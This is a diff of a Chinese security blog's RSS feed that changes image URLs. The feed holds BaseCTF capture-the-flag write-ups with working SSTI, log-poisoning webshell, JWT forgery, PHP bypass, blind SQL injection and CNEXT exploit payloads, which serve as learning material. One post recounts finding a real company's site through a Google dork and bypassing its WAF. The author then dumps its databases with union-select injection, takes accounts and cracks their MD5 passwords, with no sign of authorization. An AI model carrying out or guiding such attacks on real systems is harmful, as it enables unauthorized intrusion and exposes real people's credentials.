 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BaseCTF{%print(&amp;#39;&amp;#39;[&amp;#39;_&amp;#39;&amp;#39;_cl&amp;#39;&amp;#39;ass_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_ba&amp;#39;&amp;#39;se_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_subcla&amp;#39;&amp;#39;sses_&amp;#39;&amp;#39;_&amp;#39;]()[137][&amp;#39;_&amp;#39;&amp;#39;_in&amp;#39;&amp;#39;it_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_glo&amp;#39;&amp;#39;bals_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;po&amp;#39;&amp;#39;pen&amp;#39;](&amp;#39;cd $OLDPWD;cat flag&amp;#39;)[&amp;#39;rea&amp;#39;&amp;#39;d&amp;#39;]())%}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912210153249.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912210153249.png&#34;
 	
 	
 	
@@ -2224,7 +3533,7 @@
 &lt;p&gt;日志路径为&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;利用access.log中User-Agent写入一句话木马，然后post里面传递参数执行命令&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/8a94c7fc2a74d0201eebfb2560d22fa3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/8a94c7fc2a74d0201eebfb2560d22fa3.png&#34;
 	
 	
 	
@@ -2351,7 +3660,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;发现/login和/flag两个路由，先去login路由查看一下&lt;/p&gt;
 &lt;p&gt;post方式访问，修改为json请求并传递json数据发现一串token&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912213928943.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912213928943.png&#34;
 	
 	
 	
@@ -2363,7 +3672,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;[jwt解密网站](&lt;a class=&#34;link&#34; href=&#34;https://jwt.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;JSON Web Tokens - jwt.io&lt;/a&gt;)解析一下token，flag路由检验身份必须为admin，我们修改即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912214249462.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912214249462.png&#34;
 	
 	
 	
@@ -2374,7 +3683,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;因为源码从headers中Authorization接受数据，我们手动添加一个&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912214422838.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912214422838.png&#34;
 	
 	
 	
@@ -2399,7 +3708,7 @@
 &lt;/div&gt;&lt;p&gt;其中，&lt;code&gt;Bearer&lt;/code&gt;关键字告诉服务器，接下来的 &lt;code&gt;&amp;lt;access_token&amp;gt;&lt;/code&gt; 是一个令牌，用于授权请求。&lt;code&gt;Bearer&lt;/code&gt; 认证方式是OAuth 2.0标准的一部分，用于实现无状态的访问控制，令牌通常由身份验证服务器颁发，并在请求中传递，用于验证用户身份和权限。&lt;/p&gt;
 &lt;p&gt;总的来说，&lt;code&gt;Bearer&lt;/code&gt;前缀的作用是明确标识令牌的类型，告诉服务器如何处理和验证这个令牌。&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;所以我们构造出如下数据包即可获得flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912214738658.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912214738658.png&#34;
 	
 	
 	
@@ -2475,7 +3784,7 @@
 &lt;p&gt;在源码中注释提示// 在HTML解析后再输出PHP源代码。找了找有这几个函数highlight_file()，highlight_string()，show_source()可以直接输出到浏览器。但是后两个过不了过滤，第一个可以&lt;/p&gt;
 &lt;p&gt;又因为highlight_file函数需要指定准确的文件路径和flag的a被过滤，所以我们无法直接利用。先利用glob函数获取flag的文件名(没过滤的话就用scandir了！)&lt;/p&gt;
 &lt;p&gt;glob函数返回一个包含有匹配文件或目录的数组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918193557204.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918193557204.png&#34;
 	
 	
 	
@@ -2486,7 +3795,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;print_r打印出匹配到以fl开头的文件只有flag一个&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918193546159.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918193546159.png&#34;
 	
 	
 	
@@ -2497,7 +3806,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;构造payload&lt;code&gt;highlight_file(glob(&#39;/fl*&#39;)[0]);&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918195147853.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918195147853.png&#34;
 	
 	
 	
@@ -2618,7 +3927,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        file.write(s[:-1] + &amp;#34;\n&amp;#34;)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918203804582.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918203804582.png&#34;
 	
 	
 	
@@ -2629,7 +3938,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;burp爆破得出$array数组元素个数为45&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918210435300.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918210435300.png&#34;
 	
 	
 	
@@ -2641,7 +3950,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;payload为&lt;code&gt;len[0]=1&amp;amp;len[1]=1&amp;amp;len[2]=1&amp;amp;len[3]=1&amp;amp;len[4]=1&amp;amp;len[5]=1&amp;amp;len[6]=1&amp;amp;len[7]=1&amp;amp;len[8]=1&amp;amp;len[9]=1&amp;amp;len[10]=1&amp;amp;len[11]=1&amp;amp;len[12]=1&amp;amp;len[13]=1&amp;amp;len[14]=1&amp;amp;len[15]=1&amp;amp;len[16]=1&amp;amp;len[17]=1&amp;amp;len[18]=1&amp;amp;len[19]=1&amp;amp;len[20]=1&amp;amp;len[21]=1&amp;amp;len[22]=1&amp;amp;len[23]=1&amp;amp;len[24]=1&amp;amp;len[25]=1&amp;amp;len[26]=1&amp;amp;len[27]=1&amp;amp;len[28]=1&amp;amp;len[29]=1&amp;amp;len[30]=1&amp;amp;len[31]=1&amp;amp;len[32]=1&amp;amp;len[33]=1&amp;amp;len[34]=1&amp;amp;len[35]=1&amp;amp;len[36]=1&amp;amp;len[37]=1&amp;amp;len[38]=1&amp;amp;len[39]=1&amp;amp;len[40]=1&amp;amp;len[41]=1&amp;amp;len[42]=1&amp;amp;len[43]=1&amp;amp;len[44]=1&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;绕过接下来两个&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918214031594.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918214031594.png&#34;
 	
 	
 	
@@ -2652,7 +3961,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;最后这一步中因为PHP中ord函数只取一个字符串的首字母的ascii值，这个值肯定在0-255之间。我们可以通过爆破的方式来通过md5值的比较找出正确的字符&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918214105653.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918214105653.png&#34;
 	
 	
 	
@@ -2697,7 +4006,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;echo &amp;#34;得到flag为:&amp;#34;.$flag;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240918214306766.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240918214306766.png&#34;
 	
 	
 	
@@ -2742,7 +4051,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;此题不能用select，可以通过show databases和show tables查库名和表名，后面发现题目注释里面其实写了&lt;code&gt;//flag in ctf.flag&lt;/code&gt;,在ctf库的flag表中&lt;/p&gt;
 &lt;p&gt;直接利用show columns查看到flag表的字段，估计就在data里面。这里不能用select，我们可以尝试delete进行盲注&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919105013046.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919105013046.png&#34;
 	
 	
 	
@@ -2792,7 +4101,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;经过查表和对flag格式的了解，flag的内容就在小写字母，数字和这几个符号之间，生成一个列表进行枚举&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919105417069.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919105417069.png&#34;
 	
 	
 	
@@ -2851,7 +4160,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919120747933.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919120747933.png&#34;
 	
 	
 	
@@ -2879,7 +4188,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919125412587.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919125412587.png&#34;
 	
 	
 	
@@ -2889,7 +4198,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919125422502.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919125422502.png&#34;
 	
 	
 	
@@ -2902,7 +4211,7 @@
 &lt;hr&gt;
 &lt;h4 id=&#34;fin-back-to-the-future&#34;&gt;[Fin] Back to the future
 &lt;/h4&gt;&lt;p&gt;此题纯粹靠一款工具，我仔细看了一下，比我之前用的githack强太多了！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/3d5a4b0a90e5f04e5ad62fb22f82a6aa.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/3d5a4b0a90e5f04e5ad62fb22f82a6aa.png&#34;
 	
 	
 	
@@ -2912,7 +4221,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/1292f3fe51165928b09c40214ac8c88f.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/1292f3fe51165928b09c40214ac8c88f.png&#34;
 	
 	
 	
@@ -2935,7 +4244,7 @@
 &lt;/ol&gt;
 &lt;p&gt;&lt;code&gt;git checkout 9d85f10e0192ef630e10d7f876a117db41c30417&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;恢复出来&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919155701208.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919155701208.png&#34;
 	
 	
 	
@@ -2948,7 +4257,7 @@
 &lt;hr&gt;
 &lt;h4 id=&#34;fin-jinja-mark&#34;&gt;[Fin] Jinja Mark
 &lt;/h4&gt;&lt;p&gt;flag路径下看到提示爆破出幸运数字为5346&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240919170753741.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240919170753741.png&#34;
 	
 	
 	
@@ -3095,7 +4404,7 @@
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/ambionics/cnext-exploits&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;将data后改为.text,不然无法正常输出&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920110616225.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920110616225.png&#34;
 	
 	
 	
@@ -3106,7 +4415,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;payload&lt;code&gt;python3 cnext-exploit.py http://challenge.basectf.fun:34357/ &amp;quot;echo &#39;&amp;lt;?=@eval(\$_POST[0]);?&amp;gt;&#39; &amp;gt; shell.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920110601171.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920110601171.png&#34;
 	
 	
 	
@@ -3116,7 +4425,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920110712772.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920110712772.png&#34;
 	
 	
 	
@@ -3127,7 +4436,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;蚁剑连接执行文件即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920111821314.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920111821314.png&#34;
 	
 	
 	
@@ -3253,7 +4562,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;解题重点是这两个属性&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920165353562.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920165353562.png&#34;
 	
 	
 	
@@ -3274,7 +4583,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;传参后提示去/check检查一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920172419635.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920172419635.png&#34;
 	
 	
 	
@@ -3285,7 +4594,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;检查成功了，去对应目录ssti&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920172453507.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920172453507.png&#34;
 	
 	
 	
@@ -3296,7 +4605,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这里利用os._wrap_close中的popen方法直接执行命令即可，模块方法有很多&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240920172618248.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240920172618248.png&#34;
 	
 	
 	
@@ -3545,7 +4854,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;构造一个payload&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240921164210557.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240921164210557.png&#34;
 	
 	
 	
@@ -3556,7 +4865,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;传入后发现提前执行了析构方法echo $flag,利用成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240921164315257.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240921164315257.png&#34;
 	
 	
 	
@@ -3599,7 +4908,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;实际上生成的数据没有中括号而且前面还有三十八位无效数据影响反序列化&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240921165521033.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240921165521033.png&#34;
 	
 	
 	
@@ -3610,7 +4919,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;本地尝试发现序列化数据被截取后是无法执行的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240921170146075.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240921170146075.png&#34;
 	
 	
 	
@@ -3642,7 +4951,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;/blockquote&gt;
 &lt;p&gt;根据原先构造链输出我们需要的数据是不需要前面这38位的，可以利用以上知识利用字符串逃逸来截取掉这38位数据只留我们的payload&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240921171018546.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240921171018546.png&#34;
 	
 	
 	
@@ -3863,7 +5172,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;solved!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240921171352591.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240921171352591.png&#34;
 	
 	
 	
@@ -3877,13 +5186,13 @@
         </item>
         <item>
         <title>记一次真实站点sql注入漏洞</title>
-        <link>http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
+        <link>https://2477231995.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</link>
         <pubDate>Wed, 11 Sep 2024 11:34:30 +0800</pubDate>
         
-        <guid>http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
+        <guid>https://2477231995.github.io/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</guid>
         <description>&lt;h3 id=&#34;发现方式&#34;&gt;发现方式
 &lt;/h3&gt;&lt;p&gt;利用goole语法&lt;code&gt;inurl=&amp;quot;id=&amp;quot;&lt;/code&gt;发现某公司php站点，在id后输入&lt;code&gt;1&#39; and &#39;a&#39;=&#39;a&#39;--&lt;/code&gt;显示被waf拦截&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911115620840.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911115620840.png&#34;
 	
 	
 	
@@ -3895,7 +5204,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;这个waf我去搜了一下是西数的一个waf，挺拉的&lt;/p&gt;
 &lt;p&gt;经过尝试发现是空格被过滤了，于是将空格用+替换。输入&lt;code&gt;1&#39;+and+&#39;a&#39;=&#39;a&#39;--&lt;/code&gt;后页面报错，说明存在sql注入漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911115215785.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911115215785.png&#34;
 	
 	
 	
@@ -3934,7 +5243,7 @@
 &lt;p&gt;构造payload&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;发现只有两个库，其中一个还是系统库(°ー°〃)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911121133922.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911121133922.png&#34;
 	
 	
 	
@@ -3944,7 +5253,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911121150852.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911121150852.png&#34;
 	
 	
 	
@@ -3959,7 +5268,7 @@
 &lt;h3 id=&#34;查表&#34;&gt;查表
 &lt;/h3&gt;&lt;p&gt;构造payload&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911121503106.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911121503106.png&#34;
 	
 	
 	
@@ -3976,7 +5285,7 @@
 &lt;p&gt;构造payload&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;然后写入脚本自动化查询每张表的列名&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911122645544.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911122645544.png&#34;
 	
 	
 	
@@ -3993,7 +5302,7 @@
 &lt;p&gt;&lt;code&gt;-1+union+select+{data[i]}+from+Sanying.{km}&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;这里是从脚本里面复制出来的，我是先把列名处理成列表&lt;/p&gt;
 &lt;p&gt;这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911123931868.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911123931868.png&#34;
 	
 	
 	
@@ -4005,7 +5314,7 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;成果&#34;&gt;成果
 &lt;/h3&gt;&lt;p&gt;最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/68c8be9ac6e92351d64af7ad05e237be.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/68c8be9ac6e92351d64af7ad05e237be.png&#34;
 	
 	
 	
@@ -4028,10 +5337,10 @@
         </item>
         <item>
         <title>BaseCTF招新赛-Misc-wp</title>
-        <link>http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/</link>
+        <link>https://2477231995.github.io/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/</link>
         <pubDate>Tue, 10 Sep 2024 15:25:42 +0800</pubDate>
         
-        <guid>http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/</guid>
+        <guid>https://2477231995.github.io/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/</guid>
         <description>&lt;blockquote&gt;
 &lt;p&gt;[!NOTE]&lt;/p&gt;
 &lt;p&gt;这里我就只写一些有价值点的和我当时不会的题目的wp了&lt;/p&gt;&lt;/blockquote&gt;
@@ -4040,7 +5349,7 @@
 &lt;ol&gt;
 &lt;li&gt;先点击三个点分离立体声到单音道&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911201353232.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911201353232.png&#34;
 	
 	
 	
@@ -4053,7 +5362,7 @@
 &lt;ol start=&#34;2&#34;&gt;
 &lt;li&gt;点击左上角文件-&amp;gt;导出音频-&amp;gt;多个文件-&amp;gt;导出&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911202120041.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911202120041.png&#34;
 	
 	
 	
@@ -4064,7 +5373,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;成功导出两个wav&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911202202257.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911202202257.png&#34;
 	
 	
 	
@@ -4082,7 +5391,7 @@
 &lt;p&gt;将刚才生成的两个wav拖入进多轨会话，然后双击未命名混音项目，再将两个wav拖入右边轨道&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911202600399.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911202600399.png&#34;
 	
 	
 	
@@ -4092,7 +5401,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911202902190.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911202902190.png&#34;
 	
 	
 	
@@ -4105,7 +5414,7 @@
 &lt;ol start=&#34;5&#34;&gt;
 &lt;li&gt;双击一个轨道进入后上面工具栏点击——效果——反相&lt;/li&gt;
 &lt;/ol&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240911203031552.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240911203031552.png&#34;
 	
 	
 	
@@ -4118,7 +5427,7 @@
 &lt;ol start=&#34;6&#34;&gt;
